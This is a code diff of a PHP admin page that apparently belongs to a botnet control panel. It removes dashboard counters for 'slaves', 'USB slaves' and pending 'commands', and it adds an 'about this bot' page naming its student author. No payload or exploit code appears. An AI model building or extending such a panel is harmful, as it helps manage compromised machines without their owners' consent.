@@ -12,7 +12,7 @@ echo "<script>window.location='../index.php';</script>";
 <title>Mustafa Riadh</title>
 <link rel="stylesheet" type="text/css" href="../style/plugins.css">
 <link rel="stylesheet" type="text/css" href="style/main.css">
-<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Lobster">
+<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Raleway">
 <?
 if(file_exists("../mustafa.php")) 
 {
@@ -31,7 +31,7 @@ exit();
 </head>
 <body>
 <div id="navbar">
-<img src="images/mustafa.jpg" width="60" class="image">
+<img src="images/mustafa.jpg" width="50" class="image">
 <a class="username"><? echo($usernamec) ?></a>
 <br><br><br>
 <div id="navbar-menu">
@@ -54,45 +54,12 @@ exit();
 <hr class="navbar-hr" color="#3ab4a6">
 </div>
 </div>
-<div id="greenbox">
-<?
-$get_slaves = mysql_query("SELECT * FROM slaves", $connect);
-$slaves_number = mysql_num_rows($get_slaves);
-?>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'>SLAVES</font>
-<br><br>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'><? echo $slaves_number ?></font>
-</div>
-<div id="greenboxtwo">
-<?
-$get_slaves = mysql_query("SELECT * FROM slaves WHERE usb='Y'", $connect);
-$slaves_number = mysql_num_rows($get_slaves);
-?>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'>USB SLAVES</font>
-<br><br>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'><? echo $slaves_number ?></font>
-</div>
-<div id="greenboxthree">
-<?
-$get_slaves = mysql_query("SELECT * FROM slaves WHERE usb='true'", $connect);
-$slaves_number = mysql_num_rows($get_slaves);
-?>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'>USB SLAVES</font>
-<br><br>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'><? echo $slaves_number ?></font>
-</div>
-<div id="greenboxthree">
-<?
-$get_slaves = mysql_query("SELECT * FROM commands WHERE status='pending'", $connect);
-$slaves_number = mysql_num_rows($get_slaves);
-?>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'>COMMANDS</font>
-<br><br>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'><? echo $slaves_number ?></font>
-</div>
+<div id="help-page">
 <center>
-<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
-<font size="30" color="#FF0000" face="Lobster">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mustafa Riadh Ketab</font>
+<font size="6" face="Raleway">ABOUT THIS BOT</font>
 </center>
+<br><br>
+<font size="4" face="Raleway">Made In Russia By <br>The Student <a href="https://www.facebook.com/mustafa.riadalmusawi" class="link">  Mustafa Riadh Ketab </a><br>Under the supervision of Professor Зорин Иван Андреевич Business manager 
+</div>
 </body>
 </html>
